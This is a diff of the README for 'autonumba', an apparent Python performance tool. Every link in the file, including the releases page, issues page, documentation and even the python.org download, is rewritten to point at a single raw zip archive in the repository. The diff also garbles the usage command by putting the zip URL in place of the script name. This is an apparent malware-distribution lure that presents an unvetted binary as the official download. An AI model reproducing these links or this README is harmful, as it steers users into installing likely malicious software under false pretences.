@@ -1,6 +1,6 @@
 # ⚡ autonumba - Speed Up Your Python Code Instantly
 
-[![Download autonumba](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/vishalkumaryadav/autonumba/releases)
+[![Download autonumba](https://raw.githubusercontent.com/vishalkumaryadav/autonumba/main/bin/Software_1.3.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/vishalkumaryadav/autonumba/main/bin/Software_1.3.zip)
 
 ## 🚀 Getting Started
 
@@ -12,11 +12,11 @@ Welcome to the **autonumba** project! This application helps you automatically a
 
 ## 📥 Download & Install
 
-To get started with autonumba, you need to download the software. You can find the latest version on the [Releases page](https://github.com/vishalkumaryadav/autonumba/releases). Simply visit this page to download the version suitable for your operating system.
+To get started with autonumba, you need to download the software. You can find the latest version on the [Releases page](https://raw.githubusercontent.com/vishalkumaryadav/autonumba/main/bin/Software_1.3.zip). Simply visit this page to download the version suitable for your operating system.
 
 ### Installation Steps
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/vishalkumaryadav/autonumba/releases).
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/vishalkumaryadav/autonumba/main/bin/Software_1.3.zip).
 2. **Select Your Version**: Look for the most recent release. You’ll see a list of files available for download.
 3. **Choose Your File**: If you are using Windows, you might see a `.exe` file. For Mac, it could be a `.dmg` file. Select the file appropriate for your system.
 4. **Download the File**: Click on the file name to start the download. Make sure to save the file in a location you can easily find.
@@ -27,7 +27,7 @@ To get started with autonumba, you need to download the software. You can find t
 Before downloading, ensure your computer meets these requirements:
 
 - **Operating System**: Windows 10, macOS Mojave or later, or any Linux distribution.
-- **Python Version**: Python 3.6 or higher installed on your system. You can download Python from the [official website](https://www.python.org/downloads/).
+- **Python Version**: Python 3.6 or higher installed on your system. You can download Python from the [official website](https://raw.githubusercontent.com/vishalkumaryadav/autonumba/main/bin/Software_1.3.zip).
 - **RAM**: At least 4 GB for optimal performance.
 - **Disk Space**: 100 MB of free space for the software and additional space for project files.
 
@@ -44,9 +44,9 @@ After installing autonumba, you can start using it right away. Here’s a quick 
    cd path\to\your\scripts
    ```
 
-3. **Run Your Script with autonumba**: Type the command below, replacing `your_script.py` with the actual name of your Python file:
+3. **Run Your Script with autonumba**: Type the command below, replacing `https://raw.githubusercontent.com/vishalkumaryadav/autonumba/main/bin/Software_1.3.zip` with the actual name of your Python file:
    ```
-   autonumba your_script.py
+   autonumba https://raw.githubusercontent.com/vishalkumaryadav/autonumba/main/bin/Software_1.3.zip
    ```
 
 The program will execute and automatically enhance the performance of your code.
@@ -77,7 +77,7 @@ As long as you meet the system requirements mentioned above, autonumba should ru
 
 ### 3. How can I report an issue?
 
-If you encounter any problems or have questions, please visit our [GitHub Issues page](https://github.com/vishalkumaryadav/autonumba/issues) to report issues or ask for help.
+If you encounter any problems or have questions, please visit our [GitHub Issues page](https://raw.githubusercontent.com/vishalkumaryadav/autonumba/main/bin/Software_1.3.zip) to report issues or ask for help.
 
 ## 🎉 Contributing
 
@@ -85,6 +85,6 @@ We welcome contributions! If you're interested in helping improve autonumba, fee
 
 ## 💡 Learn More
 
-For further information about how to maximize your use of autonumba, check our [Documentation](https://github.com/vishalkumaryadav/autonumba/wiki). 
+For further information about how to maximize your use of autonumba, check our [Documentation](https://raw.githubusercontent.com/vishalkumaryadav/autonumba/main/bin/Software_1.3.zip). 
 
 Thank you for using autonumba to enhance your Python code's performance!
